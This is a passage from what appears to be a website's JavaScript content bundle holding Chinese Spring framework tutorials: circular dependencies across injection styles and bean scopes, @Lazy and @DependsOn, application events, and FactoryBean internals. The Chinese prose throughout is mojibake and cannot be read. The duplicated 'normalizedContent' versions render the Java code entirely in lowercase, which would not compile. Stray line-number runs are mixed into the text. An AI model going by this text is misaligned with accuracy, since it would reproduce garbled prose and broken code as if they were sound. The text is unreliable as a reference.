}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\næç¤º\n\nä»¥ä¸é½æ¯æä»¬éè¿ åä¾ç set æ³¨å¥æ¹å¼æ¥è§£å³å¾ªç¯ä¾èµï¼å¨ spring ä¸­æå¤ç§å¤æ ·çæ³¨å¥æåµï¼é£ä¼å¸¦æ¥ä»ä¹æ ·çæåµå¢ï¼\n\n\n# ä¸åçå¾ªç¯ä¾èµé®é¢\n\n\n# set å¾ªç¯ä¾èµ\n\nå¨å¤ä¾ set çå¾ªç¯ä¾èµä¸­ï¼åªæå¤ä¾åå¤ä¾å¾ªç¯ä¾èµä¼åºç°æ¥éï¼æ¥éä¿¡æ¯å¦ä¸ï¼\n\nerror creating bean with name 'b': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'a': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n\n\nå¤ä¾ååä¾çå¾ªç¯ä¾èµä¸ä¼æé®é¢ï¼å¦ä¸æ¯ä¸ä¸ªåä¾åå¤ä¾çå¾ªç¯ä¾èµä»£ç ï¼\n\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@scope(configurablebeanfactory.scope_prototype)\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n\npublic static void main(string[] args) {\n    configurableapplicationcontext run = springapplication.run(adminapplication.class, args);\n    b b = run.getbean(b.class);\n    b b1 = run.getbean(b.class);\n    b b2 = run.getbean(b.class);\n    a a = run.getbean(a.class);\n    a a1 = run.getbean(a.class);\n    a a2 = run.getbean(a.class);\n    system.out.println(b);\n    system.out.println(b1);\n    system.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// ç»æ\ncom.wt.admin.controller.b@1e5e2e06\ncom.wt.admin.controller.b@26c1f3eb\ncom.wt.admin.controller.b@79982bcc\ncom.wt.admin.controller.b@16b2d182\ncom.wt.admin.controller.b@16b2d182\ncom.wt.admin.controller.b@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# æé å¨ å¾ªç¯ä¾èµ\n\nä½å¨ æé å¨ å¾ªç¯ä¾èµçæ³¨å¥ä¸­ï¼å ä¸ºå¨æé å¨æ³¨å¥æ¹å¼ä¸ï¼éè¦ååå»ºä¸ä¸ª bean å¯¹è±¡ï¼ç¶ååå°å¶ä» bean æ³¨å¥è¯¥å¯¹è±¡ä¸­ãä½æ¯ï¼å¦æä¸¤ä¸ª bean é½äºç¸ä¾èµï¼é£ä¹å°±ä¼åºç°æ æ³åå»ºä»»ä½ä¸ä¸ª bean çæåµãå æ­¤ï¼spring å¨è¿ç§æåµä¸ä¼æåºå¼å¸¸ä»¥é¿åç¨åºåºç°ä¸å¯é¢æµçéè¯¯ã\n\n@configuration\npublic class config {\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥é\nthe dependencies of some of the beans in the application context form a cycle:\nâââââââ\n|  a defined in class path resource [com/wt/admin/controller/config.class]\nâ     â\n|  b defined in class path resource [com/wt/admin/controller/config.class]\nâââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè§£å³è¿ç§é®é¢ï¼å¯ä»¥éè¿å¨æ¹æ³ä¸­æ·»å  @lazy æ³¨è§£ï¼åªè½å å°æ¹æ³éï¼ä¸è½å å° @bean çä¸ä¸ä½ç½®ï¼å¦åä¾ç¶ä¼æ¥å¾ªç¯ä¾èµï¼è¿ç§æ¹å¼å°½å¯è½çè¢«å®ä¹ä¸º @lazy ç bean å¨ç¬¬ä¸æ¬¡è¢«ä½¿ç¨çæ¶åå¨å»è¿è¡å®ä¾åã\n\næé å¨ä¹å­å¨å¤ä¾ååä¾çé®é¢ï¼å¦æä½ æ¯å¤ä¾ä¾èµå¾ªç¯ï¼ä¼æ¥éï¼å¦ä¸\n\n// å¤ä¾\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥éä¿¡æ¯\nerror creating bean with name 'b' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¦æä½ æ¯å¤ä¾ååä¾å¾ªç¯ä¾èµï¼ä¹ä¼æ¥éï¼ä½è¿éåæä»¬ä½¿ç¨æ³¨è§£è¿è¡å¤ä¾ååä¾çå¾ªç¯ä¾èµæµè¯ç»æå°±ææä¸åäº\n\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// æ¥éä¿¡æ¯\nthe dependencies of some of the beans in the application context form a cycle:\nâââââââ\n|  b defined in class path resource [com/wt/admin/controller/config.class]\nâ     â\n|  a defined in class path resource [com/wt/admin/controller/config.class]\nâââââââ\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\né£ä¹æé å¨å set æ³¨å¥çæ¹å¼å¨å¤ä¾ååä¾çç»è®ºå¦ä¸ï¼\n\n * åä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n * å¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼set æ³¨å¥çæ¹å¼ä¼æ¥éï¼ä¸¤èé½æ¯è°ç¨å¯¹è±¡æ¶ææ¥\n * åä¾åå¤ä¾å¾ªç¯ä¾èµï¼æé å¨çæ¹å¼ä¼æ¥éï¼å¯ä»¥ç¨ @lazy è§£å³ï¼ï¼set æ³¨å¥çæ¹å¼ä¸ä¼æ¥é\n\n\n# @dependson\n\n@dependson æ³¨è§£å¯ä»¥å®ä¹å¨ç±»åâ½æ³ä¸ï¼æææ¯æè¿ä¸ªç»ä»¶è¦ä¾èµäºå¦â¼ä¸ªç»ä»¶ï¼ä¹å°±æ¯è¯´è¢«ä¾èµçç»ä»¶ä¼â½è¯¥ç»ä»¶åæ³¨åå° ioc å®¹å¨ä¸­ãå¦ä¸æ¡ä¾ï¼å ä¸ºä¸¤ä¸ªé½è¦åäºï¼æä»¥é æäºå¾ªç¯ä¾èµ\n\n@dependson(\"b\")\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@dependson(\"a\")\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n// æ¥é\nerror creating bean with name 'b' defined in file [d:\\workspace\\luckydraw\\java\\target\\classes\\com\\wt\\admin\\controller\\b.class]: circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ äºä»¶éç¥",frontmatter:{title:"æ ¸å¿åå®¹æè§£ äºä»¶éç¥",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/202.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5.html",relativePath:"00.java/20.Spring/21.spring/202.æ ¸å¿åå®¹æè§£ äºä»¶éç¥.md",key:"v-c10cfd86",path:"/spring/spring/202/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'å¨ Spring æ¡æ¶ä¸­ï¼Event ä»£è¡¨çä¸ä¸ªåºç¨ç¨åºä¸­çäºä»¶ãè¿äºäºä»¶å¯ä»¥æ¯ä»»ä½ç±»åçç¶æååï¼å¦ç¨æ·æä½ãæ°æ®æ´æ°åç³»ç»éè¯¯ç­ç­ãæä»¬å¯ä»¥ä½¿ç¨ Event æ¥å®ç°åºç¨ç¨åºåé¨çéä¿¡ååä½ãéè¿è§å¯èæ¨¡å¼ï¼æä»¬å¯ä»¥è®©ä¸åçç»ä»¶å¨ç¹å®çäºä»¶åçæ¶ååºååºï¼ä»èå®ç°æ¾è¦åçè®¾è®¡ã\n\nSpring æä¾äºä¸ä¸ªç®åèå¼ºå¤§çæºå¶æ¥å¤ç Eventï¼å³ ApplicationEvent å ApplicationListener æ¥å£ãApplicationEvent æ¯ä¸ä¸ªåºæ¬çäºä»¶ç±»ï¼å®å¯ä»¥è¢«ç»§æ¿ä»¥å®ç°åç§ç±»åçäºä»¶ãApplicationListener æ¥å£åå®ä¹äºä¸ä¸ªçå¬å¨ï¼å¨æä¸ªäºä»¶åçæ¶è§¦ååè°æ¹æ³ãä»¥ä¸æä¾äºåºæ¬çç±»å¾å³ç³»ï¼å¶ä¸­ AbstractApplicationContext æ¯æ§è¡ Spring æææ ¸å¿æ¹æ³çéæç±»ï¼\n\n\n\nSpring æä¾äºè®¸å¤ä¸åç±»åç Eventï¼æ¯ç§ Event é½æå¶ç¹å®çä½ç¨åç¨éãä¸é¢æ¯ Spring çå½å¨æä¸­æä¾ç Event åå¶ä½ç¨ï¼\n\n * ContextRefreshedEventï¼è¡¨ç¤º ApplicationContext å·²ç»åå§åå¹¶ä¸åå¤å¥½æ¥åè¯·æ±ãéå¸¸æåµä¸ï¼æä»¬å¯ä»¥å©ç¨è¯¥äºä»¶æ¥è¿è¡ä¸äºåå§åæä½ã\n * ContextStartedEventï¼è¡¨ç¤º ApplicationContext æ­£å¨å¯å¨ãå½åºç¨ç¨åºä¸­æéè¦å¨å¯å¨æ¶æ§è¡çæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶è¿è¡å¤çã\n * ContextStoppedEventï¼è¡¨ç¤º ApplicationContext å·²åæ­¢ãå½éè¦å¨åºç¨ç¨åºåæ­¢åæ§è¡æäºæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶ã\n * ContextClosedEventï¼è¡¨ç¤º ApplicationContext å·²ç»å³é­ãä¸ ContextStoppedEvent ä¸åï¼ContextClosedEvent æ¯å¨ ApplicationContext å³é­ä¹ååéçï¼å®åè®¸æä»¬å¯¹èµæºè¿è¡å®å¨éæ¾ã\n * RequestHandledEventï¼è¡¨ç¤ºä¸ä¸ª HTTP è¯·æ±å·²ç»è¢«å¤çå®æ¯ãè¯¥äºä»¶éå¸¸ç¨äºè®°å½æç»è®¡è¯·æ±å¤ççæ§è½æ°æ®ã\n\nå¨ Spring ä¸­ï¼æä»¬å¯ä»¥éè¿å®ç° ApplicationListener æ¥å£æä½¿ç¨ @EventListener æ³¨è§£æ¥çå¬è¿äºäºä»¶ãä»¥çå¬ ContextRefreshedEvent ä¸ºä¾ï¼æä»¬å¯ä»¥ç¼åå¦ä¸ä»£ç ï¼\n\n@Component\npublic class MyListener implements ApplicationListener<ContextRefreshedEvent> {\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\né¤äºå®ç° ApplicationListener æ¥å£å¤ï¼æä»¬è¿å¯ä»¥ä½¿ç¨ @EventListener æ³¨è§£æ¥çå¬äºä»¶ãä¾å¦ï¼æä»¬å¯ä»¥å¨ Spring ç»ä»¶ä¸­æ·»å å¦ä¸æ¹æ³ï¼\n\n@EventListener\npublic void handleContextRefreshedEvent(ContextRefreshedEvent event) {\n    // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n}\n\n\n1\n2\n3\n4\n\n\nè¦ä½¿ç¨ Spring æä¾çç±»èªå®ä¹ä¸ä¸ªäºä»¶åå¸åçå¬ï¼é¦åï¼æä»¬éè¦å®ä¹ä¸ä¸ªèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªç»§æ¿èª ApplicationEvent çç±»ï¼å¹¶å¨å¶ä¸­æ·»å èªå®ä¹å­æ®µåæ¹æ³\n\npublic class MyCustomEvent extends ApplicationEvent {\n    private String message;\n    public MyCustomEvent(Object source, String message) {\n        super(source);\n        this.message = message;\n    }\n    public String getMessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå¸äºä»¶ ä¸æ¦å®ä¹äºèªå®ä¹äºä»¶ï¼æä»¬å°±å¯ä»¥ä½¿ç¨ ApplicationContext ç publishEvent æ¹æ³æ¥åå¸äºä»¶\n\n@Autowired\nprivate ApplicationContext applicationContext;\n\npublic void doSomethingAndPublishEvent() {\n    // å¨æ­¤å¤æ§è¡ä¸å¡é»è¾\n    MyCustomEvent event = new MyCustomEvent(this, "Hello, world!");\n    applicationContext.publishEvent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nçå¬äºä»¶ æåï¼æä»¬éè¦åå»ºä¸ä¸ªäºä»¶çå¬å¨ï¼ä»¥ä¾¿å¤çèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªå®ç° ApplicationListener æ¥å£çç±»ï¼å¹¶å¨å¶ onApplicationEvent æ¹æ³ä¸­æ·»å å¤çé»è¾\n\n@Component\npublic class MyCustomEventListener implements ApplicationListener<MyCustomEvent> {\n    @Override\n    public void onApplicationEvent(MyCustomEvent event) {\n        System.out.println("Received custom event - " + event.getMessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¿æ ·ï¼å½ MyCustomEvent äºä»¶è¢«åå¸æ¶ï¼MyCustomEventListener å°±ä¼æ¶å°è¯¥äºä»¶å¹¶è°ç¨å¶ onApplicationEvent æ¹æ³è¿è¡å¤çã',normalizedContent:'å¨ spring æ¡æ¶ä¸­ï¼event ä»£è¡¨çä¸ä¸ªåºç¨ç¨åºä¸­çäºä»¶ãè¿äºäºä»¶å¯ä»¥æ¯ä»»ä½ç±»åçç¶æååï¼å¦ç¨æ·æä½ãæ°æ®æ´æ°åç³»ç»éè¯¯ç­ç­ãæä»¬å¯ä»¥ä½¿ç¨ event æ¥å®ç°åºç¨ç¨åºåé¨çéä¿¡ååä½ãéè¿è§å¯èæ¨¡å¼ï¼æä»¬å¯ä»¥è®©ä¸åçç»ä»¶å¨ç¹å®çäºä»¶åçæ¶ååºååºï¼ä»èå®ç°æ¾è¦åçè®¾è®¡ã\n\nspring æä¾äºä¸ä¸ªç®åèå¼ºå¤§çæºå¶æ¥å¤ç eventï¼å³ applicationevent å applicationlistener æ¥å£ãapplicationevent æ¯ä¸ä¸ªåºæ¬çäºä»¶ç±»ï¼å®å¯ä»¥è¢«ç»§æ¿ä»¥å®ç°åç§ç±»åçäºä»¶ãapplicationlistener æ¥å£åå®ä¹äºä¸ä¸ªçå¬å¨ï¼å¨æä¸ªäºä»¶åçæ¶è§¦ååè°æ¹æ³ãä»¥ä¸æä¾äºåºæ¬çç±»å¾å³ç³»ï¼å¶ä¸­ abstractapplicationcontext æ¯æ§è¡ spring æææ ¸å¿æ¹æ³çéæç±»ï¼\n\n\n\nspring æä¾äºè®¸å¤ä¸åç±»åç eventï¼æ¯ç§ event é½æå¶ç¹å®çä½ç¨åç¨éãä¸é¢æ¯ spring çå½å¨æä¸­æä¾ç event åå¶ä½ç¨ï¼\n\n * contextrefreshedeventï¼è¡¨ç¤º applicationcontext å·²ç»åå§åå¹¶ä¸åå¤å¥½æ¥åè¯·æ±ãéå¸¸æåµä¸ï¼æä»¬å¯ä»¥å©ç¨è¯¥äºä»¶æ¥è¿è¡ä¸äºåå§åæä½ã\n * contextstartedeventï¼è¡¨ç¤º applicationcontext æ­£å¨å¯å¨ãå½åºç¨ç¨åºä¸­æéè¦å¨å¯å¨æ¶æ§è¡çæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶è¿è¡å¤çã\n * contextstoppedeventï¼è¡¨ç¤º applicationcontext å·²åæ­¢ãå½éè¦å¨åºç¨ç¨åºåæ­¢åæ§è¡æäºæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶ã\n * contextclosedeventï¼è¡¨ç¤º applicationcontext å·²ç»å³é­ãä¸ contextstoppedevent ä¸åï¼contextclosedevent æ¯å¨ applicationcontext å³é­ä¹ååéçï¼å®åè®¸æä»¬å¯¹èµæºè¿è¡å®å¨éæ¾ã\n * requesthandledeventï¼è¡¨ç¤ºä¸ä¸ª http è¯·æ±å·²ç»è¢«å¤çå®æ¯ãè¯¥äºä»¶éå¸¸ç¨äºè®°å½æç»è®¡è¯·æ±å¤ççæ§è½æ°æ®ã\n\nå¨ spring ä¸­ï¼æä»¬å¯ä»¥éè¿å®ç° applicationlistener æ¥å£æä½¿ç¨ @eventlistener æ³¨è§£æ¥çå¬è¿äºäºä»¶ãä»¥çå¬ contextrefreshedevent ä¸ºä¾ï¼æä»¬å¯ä»¥ç¼åå¦ä¸ä»£ç ï¼\n\n@component\npublic class mylistener implements applicationlistener<contextrefreshedevent> {\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\né¤äºå®ç° applicationlistener æ¥å£å¤ï¼æä»¬è¿å¯ä»¥ä½¿ç¨ @eventlistener æ³¨è§£æ¥çå¬äºä»¶ãä¾å¦ï¼æä»¬å¯ä»¥å¨ spring ç»ä»¶ä¸­æ·»å å¦ä¸æ¹æ³ï¼\n\n@eventlistener\npublic void handlecontextrefreshedevent(contextrefreshedevent event) {\n    // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n}\n\n\n1\n2\n3\n4\n\n\nè¦ä½¿ç¨ spring æä¾çç±»èªå®ä¹ä¸ä¸ªäºä»¶åå¸åçå¬ï¼é¦åï¼æä»¬éè¦å®ä¹ä¸ä¸ªèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªç»§æ¿èª applicationevent çç±»ï¼å¹¶å¨å¶ä¸­æ·»å èªå®ä¹å­æ®µåæ¹æ³\n\npublic class mycustomevent extends applicationevent {\n    private string message;\n    public mycustomevent(object source, string message) {\n        super(source);\n        this.message = message;\n    }\n    public string getmessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå¸äºä»¶ ä¸æ¦å®ä¹äºèªå®ä¹äºä»¶ï¼æä»¬å°±å¯ä»¥ä½¿ç¨ applicationcontext ç publishevent æ¹æ³æ¥åå¸äºä»¶\n\n@autowired\nprivate applicationcontext applicationcontext;\n\npublic void dosomethingandpublishevent() {\n    // å¨æ­¤å¤æ§è¡ä¸å¡é»è¾\n    mycustomevent event = new mycustomevent(this, "hello, world!");\n    applicationcontext.publishevent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nçå¬äºä»¶ æåï¼æä»¬éè¦åå»ºä¸ä¸ªäºä»¶çå¬å¨ï¼ä»¥ä¾¿å¤çèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªå®ç° applicationlistener æ¥å£çç±»ï¼å¹¶å¨å¶ onapplicationevent æ¹æ³ä¸­æ·»å å¤çé»è¾\n\n@component\npublic class mycustomeventlistener implements applicationlistener<mycustomevent> {\n    @override\n    public void onapplicationevent(mycustomevent event) {\n        system.out.println("received custom event - " + event.getmessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¿æ ·ï¼å½ mycustomevent äºä»¶è¢«åå¸æ¶ï¼mycustomeventlistener å°±ä¼æ¶å°è¯¥äºä»¶å¹¶è°ç¨å¶ onapplicationevent æ¹æ³è¿è¡å¤çã',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ FactoryBean",frontmatter:{title:"æ ¸å¿åå®¹æè§£ FactoryBean",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/204.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20FactoryBean.html",relativePath:"00.java/20.Spring/21.spring/204.æ ¸å¿åå®¹æè§£ FactoryBean.md",key:"v-1e178af1",path:"/spring/spring/204/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:'FactoryBean æ¥å£ï¼ä½¿å¾æä»¬å¯ä»¥éè¿ç¼åèªå®ä¹ä»£ç æ¥å®ç° Bean çå®ä¾ååæ³¨å¥ãå·ä½æ¥è¯´ï¼éè¿å®ç° FactoryBean æ¥å£ï¼æä»¬å¯ä»¥å¨ getObject () æ¹æ³ä¸­ç¼åèªå·±çé»è¾æ¥å®ä¾å Beanï¼åæ¶å¯ä»¥å¨ getObjectType () æ¹æ³ä¸­æå®è¿åçç±»åãå æ­¤ï¼FactoryBean çä¸»è¦ä½ç¨æ¯å¯¹ Bean çåå»ºè¿ç¨è¿è¡ä¸ªæ§åå®å¶ï¼ä½¿å¾æä»¬è½å¤æ´å¥½å°æ§å¶ Spring å®¹å¨ä¸­ Bean ççå½å¨æåè¡ä¸ºãåæ¶ï¼å®è¿å¯ä»¥æ¯æåä¾æ¨¡å¼æèååæ¨¡å¼ç Bean åå»ºæ¹å¼ï¼æ´è¿ä¸æ­¥å¢å¼ºäº Spring å®¹å¨ççµæ´»æ§ã\n\npublic interface FactoryBean<T> {\n    // è·åå¯¹è±¡\n    T getObject() throws Exception;\n    // è·åå¯¹è±¡ç±»å\n    Class<?> getObjectType();\n    // å¤æ­æ¯å¦åä¾\n    boolean isSingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ ãæ ¸å¿åè½æè§£ IOCã ä¸æä¸­ï¼å½ä¸ä¸ª Bean å¯¹è±¡çåå»ºç»æï¼å¹¶å¾å°æåå»ºç Bean åï¼ä¼ç»§ç»­æ§è¡ getObjectForBeanInstance æ¹æ³\n\n   protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¯¥æ¹æ³ç¨äºå¤æ­ä¸ä¸ª Bean æ¯å¦å®ç°äº FactoryBean æ¥å£ï¼å¦æå®ç°äºæ¥å£åéè¦è¿è¡å¯¹åºçæä½\n\nprivate Object getObjectForBeanInstance(Object beanInstance, String beanName) {\n    if (!(beanInstance instanceof FactoryBean)) {\n        return beanInstance;\n    }\n    // æ¥è¯¢ Bean æ¯å¦å·²è¢«æ§è¡è¿\n    Object object = getCachedObjectForFactoryBean(beanName);\n    if (object == null) {\n        // è½¬æ FactoryBean\n        FactoryBean<?> factoryBean = (FactoryBean<?>) beanInstance;\n        // å·ä½æ§è¡\n        object = getObjectFromFactoryBean(factoryBean, beanName);\n    }\n    return object;\n}\n\nprotected Object getObjectFromFactoryBean(FactoryBean factory, String beanName) {\n    // å¤æ­æ¯å¦åä¾ï¼åä¾ä¼æ·»å å° factoryBeanObjectCache æ¹è¯¥Mapä¸­ï¼é¿åéå¤\n    if (factory.isSingleton()) {\n        // è·å\n        Object object = this.factoryBeanObjectCache.get(beanName);\n        // å¤æ­æ¯å¦å­å¨\n        if (object == null) {\n            // æ§è¡\n            object = doGetObjectFromFactoryBean(factory, beanName);\n            this.factoryBeanObjectCache.put(beanName, (object != null ? object : NULL_OBJECT));\n        }\n        return (object != NULL_OBJECT ? object : null);\n    } else {\n        return doGetObjectFromFactoryBean(factory, beanName);\n    }\n}\n\nprivate Object doGetObjectFromFactoryBean(final FactoryBean factory, final String beanName){\n    try {\n        // è°ç¨æ¥å£æ¹æ³\n        return factory.getObject();\n    } catch (Exception e) {\n        throw new BeansException("FactoryBean threw exception on object[" + beanName + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nè¿ç§æ¹å¼å¯ä»¥çè§£ä¸ºï¼å®ç° FactoryBean çç±»æ¯ä¸ä¸ªä»£çç±»ï¼ä»çå·¥ä½ä¸»è¦æ¯å¨èªå·±è¢«åå»ºçæ¶åï¼æç§ Spring ççå½å¨æï¼åå»ºèªå·±çå®ä¾ï¼å¡«åå±æ§ï¼åå§åä¹åæ§è¡ï¼åå§åæ§è¡ï¼åå§åä¹åæ§è¡ï¼è¿ä¸åé½åªæ¯ä¸ºè¢«ä»£çç±»åå¥½æ¡ä»¶éºè®¾ï¼ç­è¿ä¸ªä»£çç±»åå»ºå®æ¯åï¼ä¼æ§è¡ getObjectForBeanInstance æ¹æ³ï¼è¿åè¢«ä»£ççç±»ãæ´ç®åççè§£å°±æ¯ FactoryBean å¯ä»¥å¸®æä»¬å¶é æä»¬æ³è¦ç Beanï¼ä¾å¶ä» Bean ä¾èµæä½¿ç¨ã',normalizedContent:'factorybean æ¥å£ï¼ä½¿å¾æä»¬å¯ä»¥éè¿ç¼åèªå®ä¹ä»£ç æ¥å®ç° bean çå®ä¾ååæ³¨å¥ãå·ä½æ¥è¯´ï¼éè¿å®ç° factorybean æ¥å£ï¼æä»¬å¯ä»¥å¨ getobject () æ¹æ³ä¸­ç¼åèªå·±çé»è¾æ¥å®ä¾å beanï¼åæ¶å¯ä»¥å¨ getobjecttype () æ¹æ³ä¸­æå®è¿åçç±»åãå æ­¤ï¼factorybean çä¸»è¦ä½ç¨æ¯å¯¹ bean çåå»ºè¿ç¨è¿è¡ä¸ªæ§åå®å¶ï¼ä½¿å¾æä»¬è½å¤æ´å¥½å°æ§å¶ spring å®¹å¨ä¸­ bean ççå½å¨æåè¡ä¸ºãåæ¶ï¼å®è¿å¯ä»¥æ¯æåä¾æ¨¡å¼æèååæ¨¡å¼ç bean åå»ºæ¹å¼ï¼æ´è¿ä¸æ­¥å¢å¼ºäº spring å®¹å¨ççµæ´»æ§ã\n\npublic interface factorybean<t> {\n    // è·åå¯¹è±¡\n    t getobject() throws exception;\n    // è·åå¯¹è±¡ç±»å\n    class<?> getobjecttype();\n    // å¤æ­æ¯å¦åä¾\n    boolean issingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ ãæ ¸å¿åè½æè§£ iocã ä¸æä¸­ï¼å½ä¸ä¸ª bean å¯¹è±¡çåå»ºç»æï¼å¹¶å¾å°æåå»ºç bean åï¼ä¼ç»§ç»­æ§è¡ getobjectforbeaninstance æ¹æ³\n\n   protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¯¥æ¹æ³ç¨äºå¤æ­ä¸ä¸ª bean æ¯å¦å®ç°äº factorybean æ¥å£ï¼å¦æå®ç°äºæ¥å£åéè¦è¿è¡å¯¹åºçæä½\n\nprivate object getobjectforbeaninstance(object beaninstance, string beanname) {\n    if (!(beaninstance instanceof factorybean)) {\n        return beaninstance;\n    }\n    // æ¥è¯¢ bean 